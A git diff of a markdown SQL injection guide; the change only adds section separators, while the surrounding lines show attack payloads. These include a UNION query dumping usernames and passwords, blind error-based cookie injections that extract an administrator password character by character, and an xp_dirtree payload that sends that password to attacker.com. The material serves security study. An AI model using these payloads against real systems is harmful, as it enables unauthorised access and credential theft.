@@ -12,6 +12,8 @@ description: "Comprehensive guide on detecting and exploiting SQL injection vuln
 * [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
 
+---
+
 ## Overview
 
 **How to detect SQLi vulnerabilities**
@@ -30,6 +32,8 @@ description: "Comprehensive guide on detecting and exploiting SQL injection vuln
 * Example:
   * Oracle: every `SELECT` query must use the `FROM` keyword and specify a valid table
   * MySQL: the double-dash sequence must be followed by a space
+
+---
 
 ## SQL injection UNION attacks
 
@@ -113,6 +117,8 @@ You can retrieve multiple values together within this single column by concatena
 ' UNION SELECT username || '~' || password FROM users-- -
 ```
 
+---
+
 ## Blind SQLi
 
 Blind SQLi occurs when an application is vulnerable to SQLi, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
@@ -167,29 +173,45 @@ Problem: Some applications carry out SQL queries but their behavior doesn't chan
 However, if you submit an invalid query you will get an error.
 
 # 1 - Check if it's vulnerable
+---
+
 ## Normal request. 200 OK
 Cookie: TrackingId=xyz
+---
+
 ## Cause error. 500 Internal Server Error
 Cookie: TrackingId=xyz'
 
 
 # 2 - Identify database [tiberius cheatsheet]. NOTE: add comment at the end...
+---
+
 ## (MySql). 500 Internal Server Error
 Cookie: TrackingId=xyz' AND 'foo' 'bar' = 'foobar'#
+---
+
 ## (ORACLE). 200 OK
 Cookie: TrackingId=a' AND LENGTHB('foo') = '3'--
 
 
 # 3 - Test boolean error. 
+---
+
 ## Error condition: 500 OK
 Cookie: TrackingId=xyz'	AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
+---
+
 ## No error condition: 200 OK
 Cookie: TrackingId=xyz'	AND 1=(SELECT CASE WHEN (2=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
 
 
 # 4 - Extract data
+---
+
 ## Error condition: 500 OK (it means that first char is 'a')
 Cookie: TrackingId=xyz'	AND 1=(SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a') THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
+---
+
 ## No error condition: 200 OK
 Cookie: TrackingId=xyz'	AND 1=(SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'b') THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
 ```
@@ -249,6 +271,8 @@ An application might carry out a SQL query asynchronously (another thread execut
 '; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.attacker.com/a"')--
 ```
 
+---
+
 ## Tips
 
 * Sometimes when you try to break syntax you receive a response that does not indicate the parameter is vulnerable. **Check if there is a "default" \[error] response** or **Build a valid query** that provides a response indicating the parameter is vulnerable ... Example:
@@ -262,6 +286,8 @@ An application might carry out a SQL query asynchronously (another thread execut
 * **SQLi can be even in XML/JSON**...
   * If there are some protection, try **XML encode**.
 * Use `— -`  instead of `--` . In many SQL systems, there must be at least one space after `--` for the comment to be recognised.
+
+---
 
 ## Automatic exploitation
 
